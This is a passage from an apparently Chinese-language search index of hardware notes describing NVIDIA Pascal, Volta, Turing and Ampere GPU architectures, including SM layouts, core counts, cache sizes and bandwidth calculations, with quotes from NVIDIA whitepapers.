\u200b\u7684\u200b\u6240\u6709\u200b thread \u200b\u5b8c\u6210\u200b\uff0c\u200b\u786c\u4ef6\u200b\u624d\u200b\u53ef\u4ee5\u200b\u505a\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u4e2d\u95f4\u200b\u9047\u5230\u200b\u4e86\u200b\u8c03\u8bd5\u5668\u200b\u7684\u200b\u65ad\u70b9\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b thread block \u200b\u5e76\u200b\u6ca1\u6709\u200b\u5b8c\u6210\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6b64\u65f6\u200b\u53ea\u6709\u200b\u8c03\u8bd5\u5668\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b GPU\uff0c\u200b\u5176\u4ed6\u200b\u4efb\u52a1\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u5728\u200b GPGPU \u200b\u4e0a\u200b\u6267\u884c\u200b</li> <li>GP100 \u200b\u6709\u200b 6 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u5185\u90e8\u200b\u6709\u200b 5 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u5185\u90e8\u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1bGP100 \u200b\u603b\u5171\u200b\u6709\u200b \\(6*5*2=60\\) \u200b\u4e2a\u200b SM\uff08<code>A full GP100 consists of six GPCs, 60 Pascal SMs, 30 TPCs (each including two SMs)</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA core\uff0c32 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b CUDA core\uff0c4 \u200b\u4e2a\u200b texture unit</li> <li>8 \u200b\u4e2a\u200b 512 \u200b\u4f4d\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff08<code>eight 512-bit memory controllers (4096 bits total)</code>\uff09\uff0c\u200b\u6bcf\u4e2a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u9644\u5e26\u200b 512 KB L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u603b\u5171\u200b\u6709\u200b 4096 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002\u200b\u6bcf\u200b\u4e24\u4e2a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u4e3a\u200b\u4e00\u7ec4\u200b\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b 4 \u200b\u4e2a\u200b 1024 \u200b\u4f4d\u200b\u7684\u200b HBM2 \u200b\u5185\u5b58\u200b\uff08<code>Each memory controller is attached to 512 KB of L2 cache, and each HBM2 DRAM stack is controlled by a pair of memory controllers. The full GPU includes a total of 4096 KB of L2 cache.</code>\uff09</li> <li>\u200b\u652f\u6301\u200b FP16 \u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4e24\u4e2a\u200b FP16 \u200b\u6253\u5305\u200b\u8d77\u6765\u200b\u7528\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cGP100 \u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b 64 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA core\uff0c\u200b\u800c\u200b Maxwell \u200b\u6709\u200b 128 \u200b\u4e2a\u200b\uff0cKepler \u200b\u6709\u200b 192 \u200b\u4e2a\u200b\uff0cFermi \u200b\u6709\u200b 32 \u200b\u4e2a\u200b\uff0cTesla \u200b\u6709\u200b 8 \u200b\u4e2a\u200b\u3002GP100 \u200b\u7684\u200b\u4e00\u4e2a\u200b SM \u200b\u91cc\u200b\u6709\u200b\u4e24\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u6709\u200b\u4e00\u4e2a\u200b Instruction Buffer\u3001\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b Warp Scheduler\u300132 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA core\u300116 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b CUDA core\u30018 \u200b\u4e2a\u200b LD/ST Unit \u200b\u548c\u200b 8 \u200b\u4e2a\u200b SFU\uff0c\u200b\u548c\u200b Maxwell \u200b\u57fa\u672c\u200b\u4e00\u6837\u200b\u3002\u200b\u53ea\u4e0d\u8fc7\u200b Pascal \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b\u4e24\u4e2a\u200b Processing Block\uff0c\u200b\u800c\u200b Maxwell \u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b\u56db\u4e2a\u200b Processing Block\u3002\u200b\u4f46\u200b Pascal \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 KB \u200b\u7684\u200b Shared memory\uff0c\u200b\u5e76\u4e14\u200b SM \u200b\u7684\u200b\u6570\u91cf\u200b\u6bd4\u200b Maxwell \u200b\u7684\u200b\u4e24\u500d\u200b\u8fd8\u8981\u200b\u591a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u5728\u200b\u53d8\u76f8\u200b\u5730\u200b\u589e\u52a0\u200b Shared memory \u200b\u7684\u200b\u6570\u91cf\u200b\u3001\u200b\u5bb9\u91cf\u200b\u4ee5\u53ca\u200b\u5e26\u5bbd\u200b\u3002</p> <p> </p> Pascal \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA Tesla P100 Whitepaper\uff09 <p>\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cPascal \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 128 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(128 / 2 / 8 = 8\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-volta","title":"NVIDIA Volta","text":"<p>Whitepaper: NVIDIA TESLA V100 GPU ARCHITECTURE</p> <p>Tuning Guide: Tuning CUDA Applications for Volta</p> <p>PPT: VOLTA: PROGRAMMABILITY AND PERFORMANCE</p> <p>GV100 \u200b\u662f\u200b Volta \u200b\u67b6\u6784\u200b\u7684\u200b GPU\uff0c\u200b\u5b83\u200b\u7684\u200b\u6539\u8fdb\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>TSMC 12nm FFN \u200b\u5de5\u827a\u200b\uff0c815 mm^2 \u200b\u9762\u79ef\u200b\uff0c21.1 billion transistors</li> <li>\u200b\u628a\u200b Tensor Core \u200b\u5f15\u5165\u200b\u5230\u200b SM \u200b\u4e2d\u200b</li> <li>\u200b\u652f\u6301\u200b Independent Thread Scheduling\uff0c\u200b\u6539\u53d8\u200b\u4e86\u200b Warp \u200b\u7684\u200b\u5206\u53c9\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u539f\u6765\u200b Warp \u200b\u5206\u53c9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u80fd\u200b\u5148\u8d70\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u518d\u200b\u8d70\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\uff1b\u200b\u4ece\u200b Volta \u200b\u5f00\u59cb\u200b\uff0cWarp \u200b\u5206\u53c9\u200b\u4ee5\u540e\u200b\u4f1a\u200b\u53d8\u6210\u200b\u4e24\u4e2a\u200b Warp\uff0c\u200b\u56e0\u6b64\u200b\u5206\u652f\u200b\u7684\u200b\u4e24\u4e2a\u200b\u65b9\u5411\u200b\u53ef\u4ee5\u200b Interleaved \u200b\u65b9\u5f0f\u200b\u6267\u884c\u200b</li> <li>6 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 7 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1b\u200b\u4e00\u5171\u200b\u6709\u200b 84 \u200b\u4e2a\u200b SM\uff08<code>Six GPCs, Each GPC has: Seven TPCs (each including two SMs), 14 SMs</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 \u200b\u4e2a\u200b FP32 CUDA core\uff0c64 \u200b\u4e2a\u200b INT32 CUDA core\uff0c32 \u200b\u4e2a\u200b FP64 CUDA core\uff0c8 \u200b\u4e2a\u200b Tensor Core \u200b\u548c\u200b 4 \u200b\u4e2a\u200b Texture Unit\uff08<code>Each SM has: 64 FP32 cores, 64 INT32 cores, 32 FP64 cores, 8 Tensor Cores, Four texture units</code>\uff09</li> <li>8 \u200b\u4e2a\u200b 512-bit Memory Controller\uff08<code>Eight 512-bit memory controllers (4096 bits total)</code>\uff09</li> </ul> <p>GV100 \u200b\u53c8\u200b\u56de\u5230\u200b\u4e86\u200b\u6bcf\u4e2a\u200b SM \u200b\u62c6\u200b\u5206\u6210\u200b 4 \u200b\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u5305\u62ec\u200b\uff08<code>The GV100 SM is partitioned into four processing blocks, each with 16 FP32 Cores, 8 FP64 Cores, 16 INT32 Cores, two of the new mixed-precision Tensor Cores for deep learning matrix arithmetic, a new L0 instruction cache, one warp scheduler, one dispatch unit, and a 64 KB Register File. Note that the new L0 instruction cache is now used in each partition to provide higher efficiency than the instruction buffers used in prior NVIDIA GPUs. (See the Volta SM in Figure 5).</code>\uff09\uff1a</p> <ul> <li>L0 Instruction Cache</li> <li>\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b Warp Scheduler</li> <li>Register File</li> <li>16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c2 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b SFU</li> </ul> <p> </p> Volta \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA TESLA V100 GPU ARCHITECTURE Figure 5\uff09 <p>\u200b\u6ce8\u610f\u200b Volta \u200b\u7684\u200b Warp Scheduler \u200b\u53c8\u200b\u56de\u5230\u200b\u4e86\u200b\u5355\u200b\u53d1\u5c04\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u7684\u200b FP32 core \u200b\u53d8\u5c11\u200b\u4e86\u200b\uff08GP100 \u200b\u662f\u200b 32 \u200b\u4e2a\u200b\uff0cGV100 \u200b\u662f\u200b 16 \u200b\u4e2a\u200b\uff09\uff0c\u200b\u4f8b\u5982\u200b\u4e00\u6761\u200b\u6d89\u53ca\u200b 32 \u200b\u6761\u200b\u7ebf\u7a0b\u200b\u7684\u200b\u6307\u4ee4\u200b\u88ab\u200b\u53d1\u5c04\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u6765\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b2c\u4e8c\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cWarp Scheduler \u200b\u4e5f\u200b\u4f1a\u200b\u540c\u65f6\u200b\u53d1\u5c04\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u6307\u4ee4\u200b\u7ea7\u200b\u5e76\u884c\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b Understanding instruction dispatching in Volta architecture\uff0c\u200b\u5b9e\u9645\u4e0a\u200b LD/ST unit \u200b\u5e76\u200b\u4e0d\u662f\u200b\u5206\u5e03\u200b\u5728\u200b\u56db\u4e2a\u200b Processing Block \u200b\u5185\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b SM \u200b\u7ea7\u522b\u200b\u5171\u4eab\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b SM \u200b\u6709\u200b\u516c\u5171\u200b\u7684\u200b 32 \u200b\u4e2a\u200b LD/ST unit\uff0c\u200b\u8fd9\u200b 32 \u200b\u4e2a\u200b\u516c\u5171\u200b\u7684\u200b LD/ST unit \u200b\u4f9b\u200b\u56db\u4e2a\u200b Processing Block \u200b\u5171\u4eab\u200b\u3002</p> <p>\u200b\u5728\u200b Volta \u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0cL1 Data Cache \u200b\u548c\u200b Shared memory \u200b\u518d\u6b21\u200b\u5171\u4eab\u200b\u3002\u200b\u540c\u65f6\u200b\u5f15\u5165\u200b\u4e86\u200b L0 Instruction Cache\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u5185\u90e8\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u3002\u200b\u6b64\u5916\u200b\uff0cFP32 \u200b\u5355\u5143\u200b\u4ece\u200b INT32 \u200b\u5355\u5143\u200b\u72ec\u7acb\u200b\u51fa\u6765\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5b83\u4eec\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\uff08<code>the Volta GV100 SM includes separate FP32 and INT32 cores, allowing simultaneous execution of FP32 and INT32 operations at full throughput</code>\uff09\u3002\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cVolta \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 256 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(256 / 4 / 8 = 8\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u4f46\u200b\u6839\u636e\u200b https://github.com/te42kyfo/gpu-benches \u200b\u5b9e\u6d4b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u8bfb\u53d6\u200b\u4e0d\u5230\u200b 128 \u200b\u5b57\u8282\u200b\uff0814 TB/s\uff0c80 \u200b\u4e2a\u200b SM\uff0c\u200b\u65f6\u949f\u200b\u9891\u7387\u200b 1530 MHz\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b \\(14 / 80 / 1530 * 1e6 = 114\\) \u200b\u5b57\u8282\u200b\uff09\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>GV100 \u200b\u6709\u200b 6144 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff08<code>The full GV100 GPU includes a total of 6144 KB of L2 cache.</code>\uff09\uff0c\u200b\u5206\u4e3a\u200b 64 \u200b\u4e2a\u200b L2 slice\uff0c\u200b\u6bcf\u4e2a\u200b slice \u200b\u662f\u200b 96 KB \u200b\u7684\u200b\u5927\u5c0f\u200b\u3002\u200b\u6bcf\u4e2a\u200b slice \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 32 B \u200b\u7684\u200b\u6570\u636e\u200b\uff08<code>32 B/clk/slice</code>\uff09\uff0c\u200b\u56e0\u6b64\u200b\u6574\u4e2a\u200b L2 \u200b\u7f13\u5b58\u200b\u7684\u200b\u8bfb\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(64 * 32 = 2048\\) \u200b\u5b57\u8282\u200b\u6bcf\u200b\u5468\u671f\u200b\uff08<code>compared to V100 L2 cache read bandwidth of 2048 Bytes/clk.</code>\uff09\u3002L2 \u200b\u7f13\u5b58\u200b\u5de5\u4f5c\u200b\u5728\u200b\u548c\u200b SM \u200b\u540c\u4e00\u4e2a\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u6309\u200b 1530 MHz \u200b\u9891\u7387\u200b\u6765\u7b97\u200b\uff0cL2 \u200b\u7f13\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2048 * 1530 = 3.133\\) TB/s\uff0cV100 \u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b 0.9 TB/s\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u5206\u5230\u200b\u7684\u200b L2 \u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2048 / 80 = 25.6\\) \u200b\u5b57\u8282\u200b\uff08<code>V100 has a peak math rate of 125 FP16 Tensor TFLOPS, an off-chip memory bandwidth of approx. 900 GB/s, and an on-chip L2 bandwidth of 3.1 TB/s, giving it a ops:byte ratio between 40 and 139, depending on the source of an operation\u2019s data (on-chip or off-chip memory).</code>\uff09\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-turing","title":"NVIDIA Turing","text":"<p>Whitepaper: NVIDIA TURING GPU ARCHITECTURE</p> <p>PPT: RTX ON \u2013 THE NVIDIA TURING GPU</p> <p>TU102 \u200b\u662f\u200b Turing \u200b\u67b6\u6784\u200b\u7684\u200b\u4e00\u6b3e\u200b GPGPU \u200b\u82af\u7247\u200b\uff0c\u200b\u5b83\u200b\u5305\u62ec\u200b\u4e86\u200b\uff1a</p> <ul> <li>6 GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 6 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1b\u200b\u4e00\u5171\u200b\u662f\u200b 72 \u200b\u4e2a\u200b SM\uff08<code>The TU102 GPU includes six Graphics Processing Clusters (GPCs), 36 Texture Processing Clusters (TPCs), and 72 Streaming Multiprocessors (SMs).</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b\u4e00\u4e2a\u200b raster engine\uff08<code>Each GPC includes a dedicated raster engine</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 \u200b\u4e2a\u200b CUDA core\uff0c8 \u200b\u4e2a\u200b tensor core\uff0c4 \u200b\u4e2a\u200b texture unit\uff0c256 KB \u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u548c\u200b 96KB \u200b\u7684\u200b L1/Shared Memory\uff08<code>Each SM contains 64 CUDA Cores, eight Tensor Cores, a 256 KB register file, four texture units, and 96 KB of L1/shared memory</code>\uff09</li> <li>12 \u200b\u4e2a\u200b 32-bit GDDR6 memory controller\uff08<code>12 32-bit GDDR6 memory controllers (384-bits total)</code>\uff09</li> </ul> <p>Turing \u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u5206\u6210\u200b\u56db\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u5305\u62ec\u200b\uff08<code>The Turing SM is partitioned into four processing blocks, each with 16 FP32 Cores, 16 INT32 Cores, two Tensor Cores, one warp scheduler, and one dispatch unit. Each block includes a new L0 instruction cache and a 64 KB register file. The four processing blocks share a combined 96 KB L1 data cache/shared memory.</code>\uff09\uff1a</p> <ul> <li>16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c2 \u200b\u4e2a\u200b Tensor Core</li> <li>\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b Warp Scheduler</li> <li>L0 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b</li> <li>64KB \u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b</li> </ul> <p> </p> Turing \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA TURING GPU ARCHITECTURE Figure 4\uff09 <p>TU102 GPU \u200b\u6bcf\u4e2a\u200b SM \u200b\u8fd8\u6709\u200b\u4e24\u4e2a\u200b FP64 \u200b\u5355\u5143\u200b\uff0c\u200b\u56e0\u6b64\u200b TU102 \u200b\u7684\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6027\u80fd\u200b\u53ea\u6709\u200b\u5355\u7cbe\u5ea6\u200b\u6027\u80fd\u200b\u7684\u200b 1/32\u3002\uff08<code>The TU102 GPU also features 144 FP64 units (two per SM), which are not depicted in this diagram. The FP64 TFLOP rate is 1/32nd the TFLOP rate of FP32 operations. The small number of FP64 hardware units are included to ensure any programs with FP64 code operates correctly.</code>\uff09</p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b Turing \u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u7684\u200b\u5fae\u200b\u67b6\u6784\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u8bbf\u5b58\u200b\u90e8\u5206\u200b\uff08Memory I/O\uff0cMIO\uff09\u200b\u662f\u200b\u7531\u200b\u653e\u5728\u200b Processing Block \u200b\u5916\u9762\u200b\u3001SM \u200b\u91cc\u9762\u200b\u7684\u200b MIO \u200b\u5355\u5143\u200b\u5b8c\u6210\u200b\uff1a</p> <p> </p> Turing \u200b\u67b6\u6784\u200b SM \u200b\u5fae\u200b\u67b6\u6784\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aRTX ON \u2013 THE NVIDIA TURING GPU\uff09 <p> </p> Turing \u200b\u67b6\u6784\u200b MIO \u200b\u5fae\u200b\u67b6\u6784\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aRTX ON \u2013 THE NVIDIA TURING GPU\uff09 <p>Turing \u200b\u67b6\u6784\u200b\u7684\u200b\u6bcf\u200b TPC \u200b\u7684\u200b L1 \u200b\u5e26\u5bbd\u200b\u662f\u200b Pascal \u200b\u67b6\u6784\u200b\u7684\u200b\u4e24\u500d\u200b\u3002\uff08<code>increasing its hit bandwidth by 2x per TPC compared to Pascal</code>\uff09</p>"},{"location":"hardware/gpgpu.html#nvidia-ampere","title":"NVIDIA Ampere","text":"<p>Whitepaper: NVIDIA A100 Tensor Core GPU Architecture</p> <p>PPT: NVIDIA A100 GPU: PERFORMANCE &amp; INNOVATION FOR GPU COMPUTING</p> <p>\u200b\u8bba\u6587\u200b\uff1aThe A100 Datacenter GPU and Ampere Architecture</p> <p>\u200b\u8bba\u6587\u200b\uff1aDemystifying the Nvidia Ampere Architecture through Microbenchmarking and Instruction-level Analysis</p>"},{"location":"hardware/gpgpu.html#ga100","title":"GA100","text":"<p>\u200b\u5b8c\u6574\u200b\u7684\u200b GA100 \u200b\u82af\u7247\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>8 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 8 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1a\u200b\u4e00\u5171\u200b 128 \u200b\u4e2a\u200b SM\uff08<code>8 GPCs, 8 TPCs/GPC, 2 SMs/TPC, 16 SMs/GPC, 128 SMs per full GPU</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 4 \u200b\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u6709\u200b\uff1a16 \u200b\u4e2a\u200b INT32 core\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c1 \u200b\u4e2a\u200b\u7b2c\u4e09\u4ee3\u200b Tensor Core\uff0c8 \u200b\u4e2a\u200b LD/ST unit \u200b\u548c\u200b 4 \u200b\u4e2a\u200b SFU</li> <li>6 \u200b\u4e2a\u200b HBM2 stack\uff0c\u200b\u5bf9\u5e94\u200b 12 \u200b\u4e2a\u200b 512-bit memory controller\uff08<code>6 HBM2 stacks, 12 512-bit Memory Controllers</code>\uff09</li> </ul> <p>\u200b\u6bcf\u4e2a\u200b SM \u200b\u7684\u200b L1 Data Cache/Shared Memory \u200b\u603b\u91cf\u200b\u589e\u52a0\u200b\u5230\u200b\u4e86\u200b 192 KB\u3002\uff08<code>192 KB of combined shared memory and L1 data cache, 1.5x larger than V100 SM</code>\uff09</p> <p> </p> Ampere \u200b\u67b6\u6784\u200b GA100 SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA A100 Tensor Core GPU Architecture Figure 7\uff09 <p>A100 GPU \u200b\u6709\u200b 40 MB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff08<code>The A100 GPU in the A100 Tensor Core GPU includes 40 MB of L2 cache, which is 6.7x larger than Tesla V100 L2 cache.</code>\uff09\uff0c\u200b\u5206\u4e3a\u200b\u4e24\u4e2a\u200b partition\uff0c\u200b\u6bcf\u4e2a\u200b partition \u200b\u6709\u200b 40 \u200b\u4e2a\u200b L2 slice\uff0c\u200b\u6bcf\u4e2a\u200b slice \u200b\u662f\u200b 512 KB \u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u6bcf\u200b 8 \u200b\u4e2a\u200b L2 slice \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b memory controller\uff08<code>Each L2 cache partition is divided into 40 L2 cache slices. Eight 512 KB L2 slices are associated with each memory controller.</code>\uff09\u3002\u200b\u6bcf\u4e2a\u200b slice \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 64B \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6574\u4e2a\u200b L2 \u200b\u7f13\u5b58\u200b\u7684\u200b\u8bfb\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2 * 40 * 64 = 5120\\) \u200b\u5b57\u8282\u200b\u6bcf\u200b\u5468\u671f\u200b\uff08<code>The A100 L2 read bandwidth is 5120 Bytes/clk</code>\uff09\u3002L2 \u200b\u7f13\u5b58\u200b\u5de5\u4f5c\u200b\u5728\u200b\u548c\u200b SM \u200b\u540c\u4e00\u4e2a\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u6309\u200b 1410 MHz \u200b\u9891\u7387\u200b\u6765\u7b97\u200b\uff0cL2 \u200b\u7f13\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(5120 * 1410 = 7.219\\) TB/s\uff0cA100 \u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b 1.555 TB/s\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u5206\u5230\u200b\u7684\u200b L2 \u200b\u5e26\u5bbd\u200b\u662f\u200b \\(5120 / 108 = 47.4\\) \u200b\u5b57\u8282\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b https://github.com/te42kyfo/gpu-benches \u200b\u5b9e\u6d4b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u8bfb\u53d6\u200b\u4e0d\u5230\u200b 128 \u200b\u5b57\u8282\u200b\uff0819 TB/s\uff0c108 \u200b\u4e2a\u200b SM\uff0c\u200b\u65f6\u949f\u200b\u9891\u7387\u200b 1410 MHz\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b \\(19 / 108 / 1410 * 1e6 = 125\\) \u200b\u5b57\u8282\u200b\uff09\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>A100 GPU \u200b\u6709\u200b 108 \u200b\u4e2a\u200b SM\uff0c\u200b\u4e00\u5171\u200b 432 \u200b\u4e2a\u200b Tensor Core\uff0c\u200b\u6bcf\u4e2a\u200b Tensor Core \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b 256 \u200b\u4e2a\u200b FP16 FMA \u200b\u8ba1\u7b97\u200b\uff0cSM \u200b\u9891\u7387\u200b 1410 MHz\uff0c\u200b\u56e0\u6b64\u200b A100 \u200b\u7684\u200b FP16 Tensor Core \u200b\u5cf0\u503c\u200b\u6027\u80fd\u200b\u662f\u200b <code>432 * 256 FLOPS * 2 * 1410 MHz = 312 